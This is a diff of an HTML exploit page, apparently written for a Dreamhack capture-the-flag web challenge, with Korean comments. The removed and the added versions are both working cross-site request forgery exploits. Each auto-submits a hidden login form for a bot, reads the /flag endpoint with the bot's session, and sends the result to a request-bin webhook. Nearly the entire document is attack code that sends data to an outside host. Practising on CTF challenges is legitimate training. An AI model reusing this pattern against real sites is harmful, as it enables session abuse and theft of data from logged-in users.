@@ -1,33 +1,67 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
+<head>
+    <title>Exploit</title>
+</head>
 <body>
-<script>
-(async () => {
-  const exfil = "https://yxozfwj.request.dreamhack.games";
-  const username = "attacker";
-  const password = "pw123";
+    <h1>Exploiting CSRF...</h1>
+    <iframe name="hidden" style="display:none;"></iframe>
 
-  // 1) 로그인 (127.0.0.1 기준이라 admin 세션 생성)
-  const form = document.createElement("form");
-  form.action = "http://127.0.0.1:3000/login";
-  form.method = "POST";
-  form.target = "hiddenwin";
-  form.innerHTML = `<input name="username" value="${username}"><input name="password" value="${password}">`;
-  document.body.appendChild(form);
-  window.open("about:blank", "hiddenwin");
-  form.submit();
+    <script>
+        // 타겟 URL 설정 (실제 challenge URL로 변경)
+        const TARGET = "http://host8.dreamhack.games:24299";
 
-  // 2) 세션 생성 후 플래그 요청 -> 그대로 리퀘스트빈으로 프록시
-  setTimeout(async () => {
-    try {
-      const flag = await fetch("http://127.0.0.1:3000/flag", { credentials: "include", mode: "cors" })
-        .then(r => r.text());
-      await fetch(`${exfil}?f=${encodeURIComponent(flag)}`);
-    } catch (e) {
-      fetch(`${exfil}?err=${encodeURIComponent(e.message || "fail")}`);
-    }
-  }, 400);
-})();
-</script>
+        // Webhook URL (FLAG를 받을 서버)
+        const WEBHOOK = "https://dcqiyau.request.dreamhack.games";
+
+        // Step 1: 로그인 (봇이 127.0.0.1에서 접속하므로 is_admin=True)
+        function login() {
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = TARGET + '/login';
+            form.target = 'hidden';
+
+            const username = document.createElement('input');
+            username.name = 'username';
+            username.value = 'hacker';  // 미리 등록한 계정
+            form.appendChild(username);
+
+            const password = document.createElement('input');
+            password.name = 'password';
+            password.value = 'hacker123';  // 미리 등록한 계정
+            form.appendChild(password);
+
+            document.body.appendChild(form);
+            form.submit();
+
+            // 로그인 후 FLAG 획득
+            setTimeout(getFlag, 2000);
+        }
+
+        // Step 2: FLAG 획득
+        function getFlag() {
+            fetch(TARGET + '/flag', {
+                credentials: 'include'
+            })
+            .then(response => response.text())
+            .then(flag => {
+                // FLAG를 webhook으로 전송
+                fetch(WEBHOOK + '?flag=' + encodeURIComponent(flag));
+
+                // 또는 img 태그로 전송
+                const img = document.createElement('img');
+                img.src = WEBHOOK + '?flag=' + encodeURIComponent(flag);
+                document.body.appendChild(img);
+            })
+            .catch(err => {
+                console.error('Error:', err);
+            });
+        }
+
+        // 페이지 로드 시 자동 실행
+        window.onload = function() {
+            setTimeout(login, 500);
+        };
+    </script>
 </body>
 </html>
